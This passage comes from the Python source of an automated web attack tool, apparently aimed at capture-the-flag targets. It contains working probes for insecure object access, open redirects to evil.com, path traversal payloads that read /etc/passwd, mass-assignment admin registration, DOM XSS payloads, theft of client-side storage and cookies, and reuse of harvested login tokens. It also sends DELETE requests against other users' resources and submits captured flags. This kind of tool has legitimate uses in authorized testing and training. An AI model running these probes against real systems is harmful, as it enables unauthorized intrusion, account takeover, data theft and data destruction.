            except Exception:
                pass
        return findings

    async def _probe_idor(self, session, api_urls: List[str]) -> List[Dict]:
        """Test API endpoints for IDOR by accessing sequential resource IDs."""
        findings = []
        for url in api_urls:
            # Try appending /1, /2 etc. to API paths
            base_url = url.rstrip("/")
            try:
                # Get resource as ID 1
                async with session.get(f"{base_url}/1", ssl=False) as resp1:
                    if resp1.status != 200:
                        continue
                    body1 = await resp1.text()
                # Get resource as ID 2
                async with session.get(f"{base_url}/2", ssl=False) as resp2:
                    if resp2.status == 200:
                        body2 = await resp2.text()
                        if body1 != body2 and len(body2) > 50:
                            # Different content for different IDs — potential IDOR
                            await self._log_callback("warning", f"[QuickWin] IDOR: {base_url}/1 vs /2 return different data")
                            findings.append(self._make_finding(
                                "Insecure Direct Object Reference", "idor", "high",
                                base_url, "id", "1, 2", f"Different user data accessible via sequential IDs", "GET"))
            except Exception:
                continue
        return findings

    async def _probe_open_redirect(self, session, urls: List[str]) -> List[Dict]:
        """Test for open redirect vulnerabilities."""
        findings = []
        redirect_params = ["to", "url", "next", "redirect", "return_to", "goto", "dest"]
        target_urls = ["https://evil.com", "//evil.com", "https://google.com"]

        for url in urls:
            base_url = url.split("?")[0]
            for param in redirect_params:
                for target in target_urls:
                    try:
                        test_url = f"{base_url}?{param}={target}"
                        async with session.get(test_url, ssl=False, allow_redirects=False) as resp:
                            location = resp.headers.get("Location", "")
                            if resp.status in (301, 302, 303, 307, 308) and "evil.com" in location:
                                await self._log_callback("warning", f"[QuickWin] Open redirect: {base_url}?{param}=")
                                findings.append(self._make_finding(
                                    "Open Redirect", "open_redirect", "medium",
                                    base_url, param, target, f"Redirects to external URL: {location}", "GET"))
                                break
                    except Exception:
                        continue
        return findings

    async def _probe_path_traversal(self, session, urls: List[str]) -> List[Dict]:
        """Test for path traversal / local file inclusion."""
        findings = []
        traversal_payloads = [
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd", "..\\..\\..\\windows\\win.ini",
        ]
        file_params = ["file", "path", "name", "doc", "download", "filename", "load"]

        for url in urls:
            base_url = url.split("?")[0]
            # Try as query param
            for param in file_params:
                for payload in traversal_payloads:
                    try:
                        test_url = f"{base_url}?{param}={payload}"
                        async with session.get(test_url, ssl=False) as resp:
                            body = await resp.text()
                            if resp.status == 200 and ("root:" in body or "[extensions]" in body):
                                await self._log_callback("warning", f"[QuickWin] Path traversal: {base_url}?{param}=")
                                findings.append(self._make_finding(
                                    "Path Traversal / LFI", "path_traversal", "critical",
                                    base_url, param, payload, f"File contents leaked", "GET"))
                                return findings
                    except Exception:
                        continue
            # Try as path suffix
            for payload in traversal_payloads[:2]:
                try:
                    test_url = f"{base_url}/{payload}"
                    async with session.get(test_url, ssl=False) as resp:
                        body = await resp.text()
                        if resp.status == 200 and ("root:" in body or "[extensions]" in body):
                            await self._log_callback("warning", f"[QuickWin] Path traversal (path): {test_url[:80]}")
                            findings.append(self._make_finding(
                                "Path Traversal / LFI", "path_traversal", "critical",
                                base_url, "path", payload, f"File contents leaked via path", "GET"))
                            return findings
                except Exception:
                    continue
        return findings

    async def _probe_api_disclosure(self, session, base: str) -> List[Dict]:
        """Check for API documentation and information disclosure."""
        findings = []
        # GraphQL introspection
        introspection = '{"query":"{ __schema { types { name } } }"}'
        gql_urls = [f"{base}/graphql", f"{base}/api/graphql", f"{base}/gql"]
        for url in gql_urls:
            try:
                async with session.post(url, data=introspection, headers={"Content-Type": "application/json"}, ssl=False) as resp:
                    body = await resp.text()
                    if resp.status == 200 and "__schema" in body:
                        await self._log_callback("warning", f"[QuickWin] GraphQL introspection enabled: {url}")
                        findings.append(self._make_finding(
                            "GraphQL Introspection Enabled", "graphql_introspection", "medium",
                            url, "", introspection, f"Full schema accessible", "POST"))
                        break
            except Exception:
                continue
        return findings

    async def _probe_registration_abuse(self, session, base: str, reg_urls: List[str]) -> List[Dict]:
        """Test registration endpoints for abuse (mass assignment, empty registration, etc.)."""
        findings = []
        if not reg_urls:
            reg_urls = [f"{base}/api/Users", f"{base}/api/users", f"{base}/api/register"]

        for url in reg_urls[:3]:
            # Mass assignment — try to register as admin
            payloads = [
                {"email": f"test_{int(asyncio.get_event_loop().time())}@test.com", "password": "Test1234!", "role": "admin"},
                {"email": f"test2_{int(asyncio.get_event_loop().time())}@test.com", "password": "Test1234!", "isAdmin": True},
                {"email": "", "password": ""},  # Empty registration
            ]
            for payload in payloads:
                try:
                    async with session.post(url, json=payload, ssl=False) as resp:
                        body = await resp.text()
                        if resp.status in (200, 201):
                            body_lower = body.lower()
                            if '"role":"admin"' in body or '"isAdmin":true' in body.replace(" ", ""):
                                await self._log_callback("warning", f"[QuickWin] Mass assignment — admin role at {url}")
                                findings.append(self._make_finding(
                                    "Mass Assignment - Privilege Escalation", "mass_assignment", "critical",
                                    url, "role/isAdmin", json.dumps(payload), f"Registered with admin privileges", "POST"))
                            elif not payload.get("email") and "id" in body_lower:
                                await self._log_callback("warning", f"[QuickWin] Empty user registration at {url}")
                                findings.append(self._make_finding(
                                    "Empty User Registration", "improper_input_validation", "medium",
                                    url, "email", "", f"Registered with empty credentials", "POST"))
                except Exception:
                    continue
        return findings

    # ------------------------------------------------------------------
    # Phase 1.55: Credential Harvesting + Authenticated Probes
    # ------------------------------------------------------------------

    def _extract_auth_token(self, response_body: str):
        """Extract and store auth token from a successful login response."""
        if self._harvested_auth_headers:
            return  # Already have a token
        try:
            data = json.loads(response_body)
            # Common token response formats
            token = (
                data.get("token")
                or data.get("access_token")
                or (data.get("authentication", {}) or {}).get("token")
                or (data.get("data", {}) or {}).get("token")
            )
            if token and isinstance(token, str) and len(token) > 10:
                self._harvested_auth_headers = {"Authorization": f"Bearer {token}"}
        except (json.JSONDecodeError, AttributeError, TypeError):
            pass

    async def _harvest_and_reuse_credentials(self):
        """Use harvested auth tokens to run authenticated probes."""
        if not self._harvested_auth_headers:
            await self._log_callback("info", "[PIPELINE] Phase 1.55: No credentials harvested, skipping authenticated probes")
            return

        await self._log_callback("info", "[PIPELINE] Phase 1.55: Authenticated probes — using harvested credentials")

        base = self.target.rstrip("/")
        endpoints = []
        api_paths = []
        if self._recon_data:
            endpoints = [
                (e if isinstance(e, str) else e.get("url", ""))
                for e in self._recon_data.endpoints[:80]
            ]
            api_paths = [p for p in endpoints if any(k in p.lower() for k in ("/api/", "/rest/", "/v1/", "/v2/"))]

        merged_headers = {**self.auth_headers, **self._harvested_auth_headers, "User-Agent": "Mozilla/5.0 NeuroSploit/3.0"}

        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False, limit=20),
            timeout=aiohttp.ClientTimeout(total=10),
            headers=merged_headers,
        ) as session:
            probes = [
                self._probe_authed_idor(session, api_paths[:15]),
                self._probe_authed_admin(session, base),
                self._probe_authed_api_manipulation(session, base, api_paths[:15]),
                self._probe_parameter_manipulation(session, base, api_paths[:15]),
            ]
            results = await asyncio.gather(*probes, return_exceptions=True)

            wins = 0
            for result in results:
                if isinstance(result, Exception):
                    await self._log_callback("debug", f"[AuthProbe] Error: {result}")
                    continue
                if isinstance(result, list):
                    for finding in result:
                        if finding:
                            wins += 1
                            self._all_findings.append(finding)
                            await self._finding_callback(finding)
                elif result:
                    wins += 1
                    self._all_findings.append(result)
                    await self._finding_callback(result)

        await self._log_callback("info", f"[PIPELINE] Authenticated probes complete: {wins} findings")

    async def _probe_authed_idor(self, session, api_urls: List[str]) -> List[Dict]:
        """Test API endpoints for IDOR with authenticated session."""
        findings = []
        for url in api_urls:
            base_url = url.rstrip("/")
            try:
                # Access other users' resources with our auth token
                for resource_id in [1, 2, 3]:
                    async with session.get(f"{base_url}/{resource_id}", ssl=False) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            if len(body) > 50:
                                try:
                                    data = json.loads(body)
                                    # Check if we're accessing other users' data
                                    d = data.get("data", data)
                                    if isinstance(d, dict) and any(k in d for k in ("email", "username", "password", "address")):
                                        await self._log_callback("warning", f"[AuthProbe] IDOR: {base_url}/{resource_id} exposes user data")
                                        findings.append(self._make_finding(
                                            f"Authenticated IDOR", "idor", "high",
                                            f"{base_url}/{resource_id}", "id", str(resource_id),
                                            f"Authenticated access to other users' data", "GET"))
                                        finding = findings[-1]
                                        finding["agent_label"] = "AuthProbe"
                                        break
                                except json.JSONDecodeError:
                                    pass
            except Exception:
                continue
        return findings

    async def _probe_authed_admin(self, session, base: str) -> List[Dict]:
        """Access admin-only endpoints with authenticated session."""
        findings = []
        admin_urls = [
            f"{base}/api/admin", f"{base}/api/users", f"{base}/api/config",
        ]
        for url in admin_urls:
            try:
                async with session.get(url, ssl=False) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        try:
                            data = json.loads(body)
                            items = data.get("data", data)
                            if isinstance(items, list) and len(items) > 0:
                                await self._log_callback("warning", f"[AuthProbe] Authenticated data access: {url} ({len(items)} records)")
                                findings.append(self._make_finding(
                                    f"Authenticated Data Access ({url.split('/')[-1]})", "broken_access_control", "medium",
                                    url, "", "", f"Accessible with auth token. {len(items)} records returned.", "GET"))
                                findings[-1]["agent_label"] = "AuthProbe"
                        except json.JSONDecodeError:
                            pass
            except Exception:
                continue
        return findings

    async def _probe_authed_api_manipulation(self, session, base: str, api_urls: List[str]) -> List[Dict]:
        """Test API data manipulation with authenticated session (PUT, DELETE)."""
        findings = []
        # Try accessing baskets/carts of other users
        basket_urls = [p for p in api_urls if any(k in p.lower() for k in ("basket", "cart", "order"))]
        if not basket_urls:
            basket_urls = [f"{base}/api/cart", f"{base}/api/basket"]

        for url in basket_urls[:4]:
            base_url = url.rstrip("/")
            for resource_id in [1, 2, 3]:
                try:
                    async with session.get(f"{base_url}/{resource_id}", ssl=False) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            try:
                                data = json.loads(body)
                                if data.get("data") or data.get("Products") or data.get("items"):
                                    await self._log_callback("warning", f"[AuthProbe] Other user's basket: {base_url}/{resource_id}")
                                    findings.append(self._make_finding(
                                        "Broken Access Control - Other User Data", "broken_access_control", "high",
                                        f"{base_url}/{resource_id}", "id", str(resource_id),
                                        f"Accessed another user's basket/cart data", "GET"))
                                    findings[-1]["agent_label"] = "AuthProbe"
                                    break
                            except json.JSONDecodeError:
                                pass
                except Exception:
                    continue

        # Try DELETE on feedback/reviews (common CTF pattern)
        feedback_urls = [p for p in api_urls if any(k in p.lower() for k in ("feedback", "review", "comment"))]
        if not feedback_urls:
            feedback_urls = [f"{base}/api/feedback", f"{base}/api/reviews"]
        for url in feedback_urls[:2]:
            base_url = url.rstrip("/")
            for resource_id in [1, 2]:
                try:
                    async with session.delete(f"{base_url}/{resource_id}", ssl=False) as resp:
                        if resp.status == 200:
                            await self._log_callback("warning", f"[AuthProbe] Deleted resource: {base_url}/{resource_id}")
                            findings.append(self._make_finding(
                                "Unauthorized Resource Deletion", "broken_access_control", "high",
                                f"{base_url}/{resource_id}", "id", str(resource_id),
                                f"Successfully deleted resource via DELETE", "DELETE"))
                            findings[-1]["agent_label"] = "AuthProbe"
                            break
                except Exception:
                    continue
        return findings

    async def _probe_parameter_manipulation(self, session, base: str, api_urls: List[str]) -> List[Dict]:
        """Test boundary values and parameter tampering on API endpoints."""
        findings = []
        # Test feedback/rating endpoints with out-of-range values
        feedback_urls = [p for p in api_urls if any(k in p.lower() for k in ("feedback", "review", "rating", "comment"))]
        if not feedback_urls:
            feedback_urls = [f"{base}/api/feedback", f"{base}/api/reviews"]

        boundary_payloads = [
            {"comment": "test", "rating": 0},
            {"comment": "test", "rating": -1},
            {"comment": "test", "rating": 999},
        ]
        for url in feedback_urls[:2]:
            for payload in boundary_payloads:
                try:
                    async with session.post(url, json=payload, ssl=False) as resp:
                        if resp.status in (200, 201):
                            body = await resp.text()
                            try:
                                data = json.loads(body)
                                d = data.get("data", data)
                                if isinstance(d, dict) and "id" in d:
                                    rating_val = payload.get("rating")
                                    await self._log_callback("warning", f"[AuthProbe] Boundary value accepted: rating={rating_val} at {url}")
                                    findings.append(self._make_finding(
                                        f"Boundary Value Accepted (rating={rating_val})", "improper_input_validation", "medium",
                                        url, "rating", str(rating_val),
                                        f"Server accepted out-of-range value: rating={rating_val}", "POST"))
                                    findings[-1]["agent_label"] = "AuthProbe"
                            except json.JSONDecodeError:
                                pass
                except Exception:
                    continue

        # Test quantity manipulation on product/order endpoints
        product_urls = [p for p in api_urls if any(k in p.lower() for k in ("product", "item", "quantity", "basket"))]
        if not product_urls:
            product_urls = [f"{base}/api/cart/items", f"{base}/api/basket"]

        negative_payloads = [
            {"ProductId": 1, "BasketId": "1", "quantity": -1},
            {"ProductId": 1, "BasketId": "1", "quantity": 0},
        ]
        for url in product_urls[:2]:
            for payload in negative_payloads:
                try:
                    async with session.post(url, json=payload, ssl=False) as resp:
                        if resp.status in (200, 201):
                            body = await resp.text()
                            try:
                                data = json.loads(body)
                                d = data.get("data", data)
                                if isinstance(d, dict) and "id" in d:
                                    qty = payload.get("quantity")
                                    await self._log_callback("warning", f"[AuthProbe] Negative quantity accepted: {qty} at {url}")
                                    findings.append(self._make_finding(
                                        f"Negative Quantity Accepted ({qty})", "business_logic", "medium",
                                        url, "quantity", str(qty),
                                        f"Server accepted negative/zero quantity: {qty}", "POST"))
                                    findings[-1]["agent_label"] = "AuthProbe"
                            except json.JSONDecodeError:
                                pass
                except Exception:
                    continue
        return findings

    # ------------------------------------------------------------------
    # Phase 1.6: Browser Probes
    # ------------------------------------------------------------------

    async def _run_browser_probes(self):
        """Run browser-based probes for client-side vulnerabilities."""
        if not HAS_PLAYWRIGHT:
            await self._log_callback("info", "[PIPELINE] Playwright not available, skipping browser probes")
            return

        await self._log_callback("info", "[PIPELINE] Phase 1.6: Browser probes — DOM XSS, hidden pages, client-side")

        validator = BrowserValidator(screenshots_dir="reports/screenshots")
        await validator.start(headless=True)
        try:
            await self._probe_dom_xss(validator)
            await self._probe_hidden_pages(validator)
            await self._probe_client_side_exploits(validator)
        except Exception as e:
            await self._log_callback("warning", f"[BrowserProbe] Error: {e}")
        finally:
            await validator.stop()

    async def _probe_dom_xss(self, validator):
        """Test for DOM-based XSS via URL fragments and query params."""
        base = self.target.rstrip("/")
        payloads = [
            '<img src=x onerror=alert(document.domain)>',
            '"><svg onload=alert(1)>',
        ]
        # Prioritize search endpoints — these are the most common XSS vectors
        search_urls = [f"{base}/search"]
        other_urls = [base]
        if self._recon_data:
            for e in self._recon_data.endpoints[:30]:
                url = e if isinstance(e, str) else e.get("url", "")
                if url and any(k in url.lower() for k in ("search", "q=", "query")):
                    search_urls.append(url)
                elif url:
                    other_urls.append(url)
        # Search URLs first, then other URLs, deduped, limit to 6
        test_urls = list(dict.fromkeys(u for u in search_urls + other_urls if u))[:6]

        for url in test_urls:
            found = False
            for payload in payloads:
                if found:
                    break
                for injection in [f"{url}#{payload}", f"{url}?q={payload}"]:
                    try:
                        result = await validator.validate_finding(
                            finding_id=f"dom_xss_{hash(injection) % 100000}",
                            url=injection, payload=payload, timeout=8000,
                        )
                        # Only trust actual dialog execution — triggers_found alone
                        # matches framework code patterns (Angular, etc.), not real XSS
                        if result.get("dialog_detected"):
                            dialog_msgs = result.get("dialog_messages", [])
                            # Verify dialog is from our payload, not app's own dialogs
                            is_ours = any(
                                "1" in d.get("message", "") or "document.domain" in d.get("message", "")
                                or d.get("type") == "alert"
                                for d in dialog_msgs
                            ) if dialog_msgs else True
                            if not is_ours:
                                continue
                            evidence = result.get("evidence", "DOM XSS triggered")
                            screenshots = result.get("screenshots", [])
                            finding = self._make_finding(
                                "DOM-Based XSS", "xss_dom", "high",
                                url, "fragment/query", payload, evidence, "GET"
                            )
                            finding["agent_label"] = "BrowserProbe"
                            finding["screenshots"] = [
                                _embed_screenshot(s) for s in screenshots if s
                            ]
                            self._all_findings.append(finding)
                            await self._finding_callback(finding)
                            await self._log_callback("warning", f"[BrowserProbe] DOM XSS at {url[:60]}")
                            found = True
                            break
                    except Exception:
                        continue

    async def _probe_hidden_pages(self, validator):
        """Find hidden pages that only render in-browser (SPA routes, admin panels)."""
        base = self.target.rstrip("/")
        hidden_paths = [
            "/#/profile", "/#/settings", "/#/help", "/#/faq",
            "/#/terms", "/#/privacy", "/#/docs", "/#/leaderboard",
            "/admin", "/dashboard", "/debug", "/console",
        ]
        context = await validator.browser.new_context(
            ignore_https_errors=True,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
        )
        try:
            page = await context.new_page()

            # Capture baseline: navigate to homepage and fingerprint its content
            await page.goto(base, wait_until="networkidle", timeout=10000)
            home_text = await page.evaluate("() => document.body?.innerText?.substring(0, 500) || ''")

            for path in hidden_paths:
                url = f"{base}{path}"
                try:
                    resp = await page.goto(url, wait_until="networkidle", timeout=10000)
                    if not resp or resp.status >= 400:
                        continue
                    title = await page.title()
                    page_text = await page.evaluate("() => document.body?.innerText?.substring(0, 500) || ''")

                    # Skip if very similar to homepage (SPA fallback)
                    # Use word-set overlap (Jaccard similarity) — more robust than
                    # char-by-char comparison for SPAs where the nav shell is identical
                    page_words = set(page_text.lower().split())
                    home_words = set(home_text.lower().split())
                    if page_words and home_words:
                        intersection = page_words & home_words
                        union = page_words | home_words
                        similarity = len(intersection) / len(union) if union else 1.0
                    else:
                        similarity = 1.0
                    if similarity > 0.75:
                        continue
                    # Skip generic error indicators
                    if any(k in page_text.lower() for k in ("page not found", "404", "not authorized", "forbidden")):
                        continue
                    # Must have some distinct content
                    if len(page_text.strip()) < 20:
                        continue

                    # Take screenshot as evidence
                    ss_bytes = await page.screenshot(full_page=True)
                    ss_b64 = f"data:image/png;base64,{base64.b64encode(ss_bytes).decode()}"

                    finding = self._make_finding(
                        f"Hidden Page Accessible ({path})", "broken_access_control", "medium",
                        url, "", "", f"Hidden/admin page accessible. Title: {title}", "GET"
                    )
                    finding["agent_label"] = "BrowserProbe"
                    finding["screenshots"] = [ss_b64]
                    self._all_findings.append(finding)
                    await self._finding_callback(finding)
                    await self._log_callback("info", f"[BrowserProbe] Hidden page found: {path}")
                except Exception:
                    continue
        finally:
            await context.close()

    async def _probe_client_side_exploits(self, validator):
        """Test client-side exploits: cookie manipulation, localStorage exposure, etc."""
        base = self.target.rstrip("/")
        context = await validator.browser.new_context(
            ignore_https_errors=True,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
        )
        try:
            page = await context.new_page()
            await page.goto(base, wait_until="networkidle", timeout=15000)

            # Check for sensitive data in localStorage/sessionStorage
            storage_data = await page.evaluate("""() => {
                const result = {};
                try {
                    result.localStorage = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        result.localStorage[key] = localStorage.getItem(key);
                    }
                } catch(e) {}
                try {
                    result.sessionStorage = {};
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        result.sessionStorage[key] = sessionStorage.getItem(key);
                    }
                } catch(e) {}
                try { result.cookies = document.cookie; } catch(e) {}
                return result;
            }""")

            # Check for tokens/secrets in storage
            storage_str = json.dumps(storage_data).lower()
            sensitive_keys = ["token", "jwt", "auth", "session", "password", "secret", "api_key"]
            for key in sensitive_keys:
                if key in storage_str:
                    finding = self._make_finding(
                        "Sensitive Data in Client Storage", "information_disclosure", "medium",
                        base, "localStorage/cookies", key,
                        f"Sensitive data ({key}) found in client-side storage: {json.dumps(storage_data)[:500]}",
                        "GET"
                    )
                    finding["agent_label"] = "BrowserProbe"
                    self._all_findings.append(finding)
                    await self._finding_callback(finding)
                    await self._log_callback("warning", f"[BrowserProbe] Sensitive data in client storage: {key}")
                    break  # Report once

            # Check for verbose error pages by triggering 404
            try:
                await page.goto(f"{base}/nonexistent_page_12345", wait_until="networkidle", timeout=8000)
                error_content = await page.content()
                if any(p in error_content for p in ["stack trace", "Traceback", "Exception", "at Object.", "node_modules"]):
                    finding = self._make_finding(
                        "Verbose Error Page", "information_disclosure", "low",
                        f"{base}/nonexistent_page_12345", "", "",
                        "Error page reveals stack trace or internal details",
                        "GET"
                    )
                    finding["agent_label"] = "BrowserProbe"
                    self._all_findings.append(finding)
                    await self._finding_callback(finding)
            except Exception:
                pass

        finally:
            await context.close()

    def _make_finding(self, title: str, vuln_type: str, severity: str,
                      url: str, parameter: str, payload: str,
                      evidence: str, method: str = "GET") -> Dict:
        """Create a standardized finding dict."""
        return {
            "title": title,
            "vulnerability_type": vuln_type,
            "severity": severity,
            "affected_endpoint": url,
            "parameter": parameter,
            "payload": payload,
            "evidence": evidence,
            "request_method": method,
            "agent_label": "QuickWin",
            "cvss_score": {"critical": 9.8, "high": 7.5, "medium": 5.0, "low": 3.0, "info": 0.0}.get(severity, 5.0),
            "cwe_id": "",
            "description": evidence,
            "impact": f"{severity.title()} severity {vuln_type} vulnerability",
            "remediation": f"Fix {vuln_type} vulnerability",
            "references": [],
        }

    # ------------------------------------------------------------------
    # Phase 3.5: Flag Submission
    # ------------------------------------------------------------------

    async def _submit_captured_flags(self):
        """Submit captured flags to the CTF platform's submission endpoint."""
        flags = self.flag_detector.captured_flags
        if not flags:
            await self._log_callback("info", "[PIPELINE] Phase 3.5: No flags to submit")
            return

        await self._log_callback("info", f"[PIPELINE] Phase 3.5: Submitting {len(flags)} captured flag(s) to {self.ctf_submit_url}")
        submitter = CTFFlagSubmitter(self.ctf_submit_url, self.ctf_platform_token)

        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False, limit=5),
        ) as session:
            results = await submitter.submit_all(flags, session)

        accepted = 0
        for flag, result in zip(flags, results):
            flag.submitted = result.get("success", False)
            flag.submit_message = result.get("message", "")
            if flag.submitted:
                accepted += 1
                await self._log_callback("info", f"[CTF] Flag accepted: {flag.flag_value[:60]}")
            else:
                await self._log_callback("warning", f"[CTF] Flag rejected: {flag.flag_value[:60]} — {flag.submit_message[:100]}")

        await self._log_callback("info", f"[PIPELINE] Flag submission complete: {accepted}/{len(flags)} accepted")

    @staticmethod
    def _static_default_attack_plan() -> List[str]:
        """Fallback vuln type list (same order as AutonomousAgent._default_attack_plan)."""
        return [
            "sqli_error", "sqli_union", "command_injection", "ssti",
            "auth_bypass", "insecure_deserialization", "rfi", "file_upload",
            "xss_reflected", "xss_stored", "lfi", "ssrf", "ssrf_cloud",
            "xxe", "path_traversal", "idor", "bola",
            "sqli_blind", "sqli_time", "jwt_manipulation",
            "privilege_escalation", "arbitrary_file_read",
            "nosql_injection", "ldap_injection", "xpath_injection",
            "blind_xss", "xss_dom", "cors_misconfig", "csrf",
            "open_redirect", "session_fixation", "bfla",
            "mass_assignment", "race_condition", "host_header_injection",
            "http_smuggling", "subdomain_takeover",
            "security_headers", "clickjacking", "http_methods", "ssl_issues",
            "directory_listing", "debug_mode", "exposed_admin_panel",
            "exposed_api_docs", "insecure_cookie_flags",
            "sensitive_data_exposure", "information_disclosure",
            "api_key_exposure", "version_disclosure",
            "crlf_injection", "header_injection", "prototype_pollution",
            "graphql_introspection", "graphql_dos", "graphql_injection",
            "cache_poisoning", "parameter_pollution", "type_juggling",
            "business_logic", "rate_limit_bypass", "timing_attack",
            "weak_encryption", "weak_hashing", "cleartext_transmission",
            "vulnerable_dependency", "s3_bucket_misconfiguration",
            "cloud_metadata_exposure", "soap_injection",
            "source_code_disclosure", "backup_file_exposure",
            "csv_injection", "html_injection", "log_injection",
            "email_injection", "expression_language_injection",
            "mutation_xss", "dom_clobbering", "postmessage_vulnerability",
            "websocket_hijacking", "css_injection", "tabnabbing",
            "default_credentials", "weak_password", "brute_force",
            "two_factor_bypass", "oauth_misconfiguration",
            "forced_browsing", "arbitrary_file_delete", "zip_slip",
            "orm_injection", "improper_error_handling",
            "weak_random", "insecure_cdn", "outdated_component",
            "container_escape", "serverless_misconfiguration",
            "rest_api_versioning", "api_rate_limiting",
            "excessive_data_exposure",
        ]
